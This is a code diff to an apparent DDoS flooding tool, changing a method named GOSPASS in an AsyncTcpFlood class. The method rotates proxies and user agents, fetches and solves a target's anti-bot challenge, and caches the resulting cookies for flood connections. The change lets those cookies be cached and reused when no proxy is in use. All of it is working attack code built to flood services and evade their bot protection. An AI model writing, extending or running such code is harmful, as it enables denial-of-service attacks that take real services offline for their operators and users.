@@ -436,11 +436,12 @@ class AsyncTcpFlood(FloodBase):
         return packets_sent > 0
 
     async def GOSPASS(self, on_connect=None) -> bool:
+        solver = GOSSolver()
         packets_sent = 0
         user_agent = random.choice(USERAGENTS)
         proxy_url = self._proxies.pick_random()
         if proxy_url is None:
-            connector, proxy_ip = None, None
+            connector, proxy_ip = None, solver.OWN_IP_KEY
         else:
             connector = ProxyConnector.from_url(proxy_url, ssl=False)
             # we always replace proxy host with resolved addr
@@ -448,13 +449,12 @@ class AsyncTcpFlood(FloodBase):
         req_timeout = self._settings.http_response_timeout_seconds
         cl_timeout = aiohttp.ClientTimeout(
             connect=self._settings.connect_timeout_seconds, total=30)
-        solver = GOSSolver()
         conn_id = str(uuid.uuid4())
         async with aiohttp.ClientSession(
             connector=connector,
             timeout=cl_timeout,
         ) as s:
-            cached_cookies = solver.lookup(solver.DEFAULT_A, proxy_ip) if proxy_ip is not None else None
+            cached_cookies = solver.lookup(solver.DEFAULT_A, proxy_ip)
             if cached_cookies is None:
                 # there's certainly a race condition here between us looking up
                 # in the dictionary and tasks are already running to fetch challenge
@@ -472,7 +472,7 @@ class AsyncTcpFlood(FloodBase):
                     payload = dict(await response.json())
                     if not "cn" in payload:
                         raise RuntimeError("Invalid challenge payload")
-                (latest_ts, cookies) = solver.solve(user_agent, payload)
+                (latest_ts, cookies) = solver.solve(user_agent, payload, cache_key=proxy_ip)
                 self._connections.add(conn_id)
             else:
                 (latest_ts, user_agent, cookies) = cached_cookies
